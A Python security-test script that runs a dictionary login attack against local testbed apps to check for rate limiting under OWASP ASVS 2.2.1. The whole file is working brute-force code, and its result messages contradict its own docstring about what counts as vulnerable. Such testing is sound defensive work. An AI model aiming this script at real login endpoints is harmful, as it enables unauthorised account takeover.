#!/usr/bin/env python3
"""
A2 — Credential Stuffing
OWASP ASVS v4.2 § 2.2.1 — Verify anti-automation controls exist.
MITRE ATT&CK T1110.004

Usage:
    python3 A2_credential_stuffing.py <base_url> [wordlist_path]

Examples:
    python3 A2_credential_stuffing.py http://app-c-v.local:8083
    python3 A2_credential_stuffing.py http://app-a-v.local:8081

Result:
    VULNERABLE — no rate-limiting detected across the wordlist (no 429)
    PROTECTED  — 429 Too Many Requests observed
"""
import sys
import time
import urllib.request
import urllib.parse
import urllib.error
from pathlib import Path

EMAIL         = "testuser@example.com"
WORDLIST_PATH = Path(__file__).parent.parent / "wordlists" / "top100_passwords.txt"


def attempt(base_url: str, path: str, email: str, password: str) -> tuple[int, float]:
    url  = base_url.rstrip("/") + path
    data = urllib.parse.urlencode({"email": email, "password": password}).encode()
    req  = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent",   "sso-testbed-attacker/1.0")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, time.monotonic() - t0
    except urllib.error.HTTPError as e:
        return e.code, time.monotonic() - t0
    except Exception as e:
        print(f"  [ERR] {e}")
        return 0, time.monotonic() - t0


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    base_url = sys.argv[1]
    wordlist = Path(sys.argv[2]) if len(sys.argv) > 2 else WORDLIST_PATH

    path = "/api/accounts/login"
    if "8081" in base_url or "app-a" in base_url:
        path = "/login"

    passwords = [p.strip() for p in wordlist.read_text().splitlines() if p.strip()]
    print(f"[A2] Credential stuffing: {base_url}{path}  user={EMAIL}")
    print(f"     Wordlist: {wordlist}  ({len(passwords)} passwords)\n")

    rate_limited = False
    success_at   = None

    for i, pwd in enumerate(passwords, 1):
        status, elapsed = attempt(base_url, path, EMAIL, pwd)
        marker = ""
        if status == 200:
            success_at = (i, pwd)
            marker = "  ← SUCCESS"
        elif status == 429:
            rate_limited = True
            marker = "  ← RATE LIMITED"
        print(f"  [{i:03d}] pwd={pwd:<20s} status={status}  {elapsed*1000:.0f}ms{marker}")
        if rate_limited or success_at:
            break

    print()
    if success_at:
        idx, pwd = success_at
        print(f"VULNERABLE — password '{pwd}' accepted at attempt {idx}")
    elif rate_limited:
        print(f"PROTECTED — rate limiting (HTTP 429) triggered after {i} attempt(s)")
    else:
        print(f"PROTECTED — no password matched across {len(passwords)} attempts")


if __name__ == "__main__":
    main()
